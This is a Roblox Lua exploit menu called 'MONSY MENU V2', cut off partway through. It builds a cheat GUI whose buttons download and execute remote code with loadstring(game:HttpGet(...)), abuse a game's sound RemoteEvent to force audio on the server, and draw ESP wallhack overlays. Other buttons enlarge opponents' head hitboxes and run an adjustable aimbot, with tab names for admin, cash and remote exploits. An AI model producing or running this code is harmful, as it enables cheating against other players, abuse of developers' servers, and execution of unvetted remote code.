local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local function new(class, props)
	local obj = Instance.new(class)
	if props then
		for k,v in pairs(props) do
			obj[k] = v
		end
	end
	return obj
end

local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://315416964"
clickSound.Volume = 0.5
clickSound.Parent = playerGui

local currentTheme = "WHITE"
local themes = {
	WHITE = {primary = Color3.fromRGB(0,0,0), accent = Color3.fromRGB(200,200,200)},
	RED   = {primary = Color3.fromRGB(0,0,0), accent = Color3.fromRGB(255,50,50)},
	BLUE  = {primary = Color3.fromRGB(0,0,0), accent = Color3.fromRGB(50,150,255)},
	GRAY  = {primary = Color3.fromRGB(0,0,0), accent = Color3.fromRGB(200,200,200)},
	PINK  = {primary = Color3.fromRGB(0,0,0), accent = Color3.fromRGB(255,100,200)},
}

local screenGui = new("ScreenGui", {
	Name = "MONSY_GUI",
	ResetOnSpawn = false,
	Parent = playerGui,
	DisplayOrder = 1000,
})

local main = new("Frame", {
	Name = "MainFrame",
	Size = UDim2.new(0, 860, 0, 520),
	Position = UDim2.new(0.5, -430, 0.5, -260),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
	Parent = screenGui,
})
main.ClipsDescendants = true
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = main})

-- Make draggable
local dragging, dragInput, dragStart, startPos
local function update(input)
	local delta = input.Position - dragStart
	main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

main.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = main.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

main.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

-- Left Panel
local leftPanel = new("Frame", {
	Name = "LeftPanel",
	Size = UDim2.new(0, 220, 1, 0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
	Parent = main,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = leftPanel})

local divider = new("Frame", {
	Parent = leftPanel,
	Size = UDim2.new(0, 1, 1, -24),
	Position = UDim2.new(1, -1, 0, 12),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 14, 0, 14),
	Size = UDim2.new(1, -28, 0, 32),
	Text = "MONSY MENU V2",
	Font = Enum.Font.GothamBlack,
	TextSize = 25,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Left,
})

local avatarFrame = new("Frame", {
	Parent = leftPanel,
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	Size = UDim2.new(0, 100, 0, 100),
	Position = UDim2.new(0.5, -50, 0, 60),
	BorderSizePixel = 0,
	ClipsDescendants = true,
})

local ring = new("Frame", {
	Parent = avatarFrame,
	Size = UDim2.new(1,0,1,0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = ring})

local inner = new("Frame", {
	Parent = ring,
	Size = UDim2.new(0.86,0,0.86,0),
	Position = UDim2.new(0.07,0,0.07,0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = inner})

local avatar = new("ImageLabel", {
	Parent = inner,
	BackgroundTransparency = 1,
	Size = UDim2.new(1,0,1,0),
	Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150),
})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = avatar})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 0, 0, 170),
	Size = UDim2.new(1, 0, 0, 28),
	Text = player.DisplayName,
	Font = Enum.Font.GothamBold,
	TextSize = 16,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Center,
})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 0, 0, 194),
	Size = UDim2.new(1, 0, 0, 20),
	Text = "@" .. player.Name,
	Font = Enum.Font.Gotham,
	TextSize = 13,
	TextColor3 = Color3.fromRGB(80,80,80),
	TextXAlignment = Enum.TextXAlignment.Center,
})

local socialLine = new("Frame", {
	Parent = leftPanel,
	Size = UDim2.new(0.8, 0, 0, 1),
	Position = UDim2.new(0.1, 0, 0, 260),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 0, 0, 310),
	Size = UDim2.new(1, 0, 0, 120),
	Text = "@theyluvmonsy\n\n@https://discord.gg/ewhxdTTE\n\n@iluvmonz tiktok\n\n@iluvmonz youtube",
	Font = Enum.Font.Gotham,
	TextSize = 12,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Center,
	TextYAlignment = Enum.TextYAlignment.Top,
	TextWrapped = true,
})

local rightPanel = new("Frame", {
	Name = "RightPanel",
	Parent = main,
	Size = UDim2.new(1, -220, 1, -50),
	Position = UDim2.new(0, 220, 0, 0),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = rightPanel})

local titleLabel = new("TextLabel", {
	Parent = rightPanel,
	Position = UDim2.new(0, 16, 0, 12),
	Size = UDim2.new(1, -32, 0, 32),
	BackgroundTransparency = 1,
	Text = "MAIN MENU",
	Font = Enum.Font.GothamBold,
	TextSize = 20,
	TextColor3 = Color3.new(0,0,0),
	TextXAlignment = Enum.TextXAlignment.Left,
})

local tabBar = new("ScrollingFrame", {
	Parent = rightPanel,
	Position = UDim2.new(0, 16, 0, 56),
	Size = UDim2.new(1, -32, 0, 44),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
	ScrollBarThickness = 6,
	ScrollBarImageColor3 = Color3.fromRGB(200,200,200),
	CanvasSize = UDim2.new(0,0,0,0),
	ScrollingDirection = Enum.ScrollingDirection.X,
	AutomaticCanvasSize = Enum.AutomaticSize.X,
})
new("UICorner", {CornerRadius = UDim.new(0,8), Parent = tabBar})

local tabLayout = new("UIListLayout", {
	Parent = tabBar,
	FillDirection = Enum.FillDirection.Horizontal,
	Padding = UDim.new(0, 8),
	SortOrder = Enum.SortOrder.LayoutOrder,
})

local contentArea = new("Frame", {
	Parent = rightPanel,
	Position = UDim2.new(0, 16, 0, 108),
	Size = UDim2.new(1, -32, 1, -166),
	BackgroundTransparency = 1,
	ClipsDescendants = true,
})

local bottomBar = new("Frame", {
	Parent = main,
	Position = UDim2.new(0, 220, 1, -50),
	Size = UDim2.new(1, -220, 0, 50),
	BackgroundColor3 = Color3.fromRGB(255,255,255),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = bottomBar})

local allTabButtons = {}
local allTabPanels = {}
local currentTab = "MAIN MENU"

local function showTab(name)
	if currentTab == name then return end
	if currentTab and allTabPanels[currentTab] then
		allTabPanels[currentTab].Visible = false
	end
	currentTab = name
	if allTabPanels[name] then
		allTabPanels[name].Visible = true
	end
	titleLabel.Text = name
	local t = themes[currentTheme]
	for _, obj in ipairs(screenGui:GetDescendants()) do
		if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
			obj.TextColor3 = t.primary
		end
	end
	if divider then divider.BackgroundColor3 = Color3.fromRGB(255,255,255) end
	if ring then ring.BackgroundColor3 = Color3.fromRGB(255,255,255) end
	for _, btn in ipairs(allTabButtons) do
		if currentTab == btn.Text then
			btn.BackgroundColor3 = t.accent
		else
			btn.BackgroundColor3 = Color3.fromRGB(245,245,245)
		end
	end
end

local topTabNames = {
	"MAIN MENU", "ROLEPLAY MENU", "ROLEPLAY MENU 2", "LATEST SCRIPT",
	"BRING MENU", "AIMBOT MENU", "SCRIPT MENU", "CASH MENU", "PLAYER MENU",
	"MONSY MENU", "THE BILLIONARE", "RP TELEPORT", "ADMIN PANEL", "REMOTES"
}

local function createTopTab(name)
	local btn = new("TextButton", {
		Parent = tabBar,
		Size = UDim2.new(0, 110, 1, -12),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		Text = name,
		Font = Enum.Font.GothamSemibold,
		TextSize = 13,
		TextColor3 = Color3.new(0,0,0),
		AutoButtonColor = false,
		TextXAlignment = Enum.TextXAlignment.Center,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		if currentTab ~= name then
			TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(230,230,230)}):Play()
		end
	end)
	btn.MouseLeave:Connect(function()
		if currentTab ~= name then
			TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245,245,245)}):Play()
		end
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		showTab(name)
	end)

	local panel = new("ScrollingFrame", {
		Parent = contentArea,
		Size = UDim2.new(1,0,1,0),
		BackgroundTransparency = 1,
		Visible = false,
		ScrollBarThickness = 6,
		ScrollBarImageColor3 = Color3.fromRGB(200,200,200),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
	})
	new("UIListLayout", {Parent = panel, Padding = UDim.new(0,8)})

	allTabPanels[name] = panel
	table.insert(allTabButtons, btn)
	return panel
end

for _, name in ipairs(topTabNames) do
	createTopTab(name)
end

local bottomTabs = {"PLAYER LIST", "SETTINGS", "LUA EXECUTOR"}

local function createBottomTab(name)
	local btn = new("TextButton", {
		Parent = bottomBar,
		Size = UDim2.new(0, 140, 1, -16),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		Text = name,
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		TextColor3 = Color3.new(0,0,0),
		AutoButtonColor = false,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	local function positionButton()
		local totalWidth = #bottomTabs * 140 + (#bottomTabs-1) * 16
		local startX = (bottomBar.AbsoluteSize.X - totalWidth) / 2
		btn.Position = UDim2.new(0, startX + (table.find(bottomTabs, name)-1)*(140+16), 0, 8)
	end
	task.delay(0, positionButton)
	bottomBar:GetPropertyChangedSignal("AbsoluteSize"):Connect(positionButton)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		showTab(name)
	end)

	local panel = new("ScrollingFrame", {
		Parent = contentArea,
		Size = UDim2.new(1,0,1,0),
		BackgroundTransparency = 1,
		Visible = false,
		ScrollBarThickness = 6,
		ScrollBarImageColor3 = Color3.fromRGB(200,200,200),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
	})
	new("UIListLayout", {Parent = panel, Padding = UDim.new(0,8)})

	allTabPanels[name] = panel
	table.insert(allTabButtons, btn)
	return panel
end

for _, name in ipairs(bottomTabs) do
	createBottomTab(name)
end

if allTabButtons[1] then
	allTabButtons[1].BackgroundColor3 = Color3.fromRGB(200,200,200)
end
showTab("MAIN MENU")

----------------------------------------------------------------
-- MAIN MENU BUTTONS (UNLIMITED SCROLL)
----------------------------------------------------------------
local function addMainMenuButton(text, callback)
	local panel = allTabPanels["MAIN MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(230,230,230)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245,245,245)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("INFINITE YIELD (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end) 

addMainMenuButton("MUSIC EXPLOITS (MONSY)", function()
	-- PUBLIC ENEMY CMD - Minimal FE Audio Player (White Font Update)
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local InjectTo = game:GetService("TestService")

-- Find RemoteEvent
local function findRemote()
	for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			return v
		end
	end
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			return v
		end
	end
	return nil
end

local remote = findRemote()

-- GUI
local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "TAONG_GOMA_CMD_GUI"
gui.ResetOnSpawn = false

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 300, 0, 120)
main.Position = UDim2.new(0.5, -150, 0.5, -60)
main.BackgroundColor3 = Color3.fromRGB(255,255,255)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0.25, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "PUBLIC ENEMY MUSIC EXPLOITS"
title.TextColor3 = Color3.fromRGB(0,0,0) -- White
title.BackgroundTransparency = 1
title.Font = Enum.Font.SourceSansBold
title.TextSize = 22

local inputBox = Instance.new("TextBox", main)
inputBox.Size = UDim2.new(0.9, 0, 0.25, 0)
inputBox.Position = UDim2.new(0.05, 0, 0.35, 0)
inputBox.PlaceholderText = "Enter Music ID [3KTG]"
inputBox.Text = ""
inputBox.TextColor3 = Color3.fromRGB(0,0,0)
inputBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
inputBox.Font = Enum.Font.SourceSansBold
inputBox.TextSize = 18
inputBox.ClearTextOnFocus = false

local toggleButton = Instance.new("TextButton", main)
toggleButton.Size = UDim2.new(0.5, 0, 0.2, 0)
toggleButton.Position = UDim2.new(0.25, 0, 0.7, 0)
toggleButton.Text = "OFF"
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White
toggleButton.BackgroundTransparency = 1
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.TextSize = 24

local isOn = false
local soundName = "TG_SOUND_" .. tostring(math.random(1000,9999))

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"

		local id = inputBox.Text
		if id == "" then
			warn("No music ID entered")
			return
		end

		if remote then
			pcall(function()
				remote:FireServer("newSound", soundName, InjectTo, "rbxassetid://" .. id, 1, 1, true, 0)
				remote:FireServer("playSound", soundName)
			end)
		else
			warn("AC6 RemoteEvent not found")
		end
	else
		toggleButton.Text = "OFF"

		if remote then
			pcall(function()
				remote:FireServer("stopSound", soundName)
			end)
		end
	end
end)
end)

addMainMenuButton("ESP PLAYER (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "ESP_Toggle_GUI"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 35)
toggleButton.Position = UDim2.new(0, 20, 0, 120)
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
toggleButton.Text = "ESP: ON"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 14
toggleButton.Parent = gui

local corner = Instance.new("UICorner", toggleButton)
corner.CornerRadius = UDim.new(0, 6)

--// Toggle State
local ESP_ENABLED = true
local ESPObjects = {}

--// Drawing Helpers
local function newLine()
	local line = Drawing.new("Line")
	line.Thickness = 2
	line.Color = Color3.fromRGB(255, 255, 255) -- Changed to white
	line.Visible = true
	return line
end

local function newText()
	local text = Drawing.new("Text")
	text.Size = 14
	text.Color = Color3.fromRGB(255, 255, 255)
	text.Center = true
	text.Outline = true
	text.Visible = true
	return text
end

local function clearESP(player)
	if ESPObjects[player] then
		for _, obj in pairs(ESPObjects[player]) do
			if obj.Remove then obj:Remove() end
		end
		ESPObjects[player] = nil
	end
end

--// Get 2D screen position of 3D part
local function getPartPos(part)
	if not part then return nil, false end
	local pos, visible = Camera:WorldToViewportPoint(part.Position)
	return Vector2.new(pos.X, pos.Y), visible
end

--// ESP Rendering
RunService.RenderStepped:Connect(function()
	if not ESP_ENABLED then
		for _, v in pairs(ESPObjects) do
			for _, obj in pairs(v) do
				obj.Visible = false
			end
		end
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			local char = player.Character
			local esp = ESPObjects[player]

			if not esp then
				esp = {
					HeadToTorso = newLine(),
					TorsoToLeftArm = newLine(),
					TorsoToRightArm = newLine(),
					TorsoToLeftLeg = newLine(),
					TorsoToRightLeg = newLine(),
					Name = newText(),
				}
				ESPObjects[player] = esp
			end

			local headPos, headVis = getPartPos(char:FindFirstChild("Head"))
			local torsoPos, torsoVis = getPartPos(char:FindFirstChild("HumanoidRootPart"))
			local laPos, laVis = getPartPos(char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"))
			local raPos, raVis = getPartPos(char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"))
			local llPos, llVis = getPartPos(char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"))
			local rlPos, rlVis = getPartPos(char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg"))

			if headVis and torsoVis then
				esp.HeadToTorso.From = headPos
				esp.HeadToTorso.To = torsoPos
				esp.HeadToTorso.Visible = true
			else
				esp.HeadToTorso.Visible = false
			end

			if torsoVis and laVis then
				esp.TorsoToLeftArm.From = torsoPos
				esp.TorsoToLeftArm.To = laPos
				esp.TorsoToLeftArm.Visible = true
			else
				esp.TorsoToLeftArm.Visible = false
			end

			if torsoVis and raVis then
				esp.TorsoToRightArm.From = torsoPos
				esp.TorsoToRightArm.To = raPos
				esp.TorsoToRightArm.Visible = true
			else
				esp.TorsoToRightArm.Visible = false
			end

			if torsoVis and llVis then
				esp.TorsoToLeftLeg.From = torsoPos
				esp.TorsoToLeftLeg.To = llPos
				esp.TorsoToLeftLeg.Visible = true
			else
				esp.TorsoToLeftLeg.Visible = false
			end

			if torsoVis and rlVis then
				esp.TorsoToRightLeg.From = torsoPos
				esp.TorsoToRightLeg.To = rlPos
				esp.TorsoToRightLeg.Visible = true
			else
				esp.TorsoToRightLeg.Visible = false
			end

			if headVis then
				esp.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
				esp.Name.Text = player.Name
				esp.Name.Visible = true
			else
				esp.Name.Visible = false
			end
		end
	end
end)

--// Player leave cleanup
Players.PlayerRemoving:Connect(function(player)
	clearESP(player)
end)

--// Toggle Button
toggleButton.MouseButton1Click:Connect(function()
	ESP_ENABLED = not ESP_ENABLED
	toggleButton.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF"
end)
end)

addMainMenuButton("BIG HEAD PLAYER (MONSY)", function()
	_G.HeadSize = 6 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.Head.Transparency = 0.4 v.Character.Head.BrickColor = BrickColor.new("Red") v.Character.Head.Material = "Neon" v.Character.Head.CanCollide = false v.Character.Head.Massless = true end) end end end end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KEYBIND Q TO FREECAM (MONSY)", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 60
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.15
local MAX_PITCH = 89

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false -- NEW: para pigilan extra input sa frame ng toggle

-- Helpers for movement direction
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end  -- forward
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end -- backward
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- Toggle freecam
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new() -- NEW: reset movement dir agad
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled
	end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end -- NEW: block key presses sa toggle frame

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end -- NEW: block releases sa toggle frame

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false -- reset block flag after 1 frame
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

addMainMenuButton("AIMBOT ADJUSTABLE (MONSY)", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY AIMBOT" -- Custom Title
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(0,0,0)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.SourceSans
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- Toggle button for Show/Hide
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "FOV: Visible"
ToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
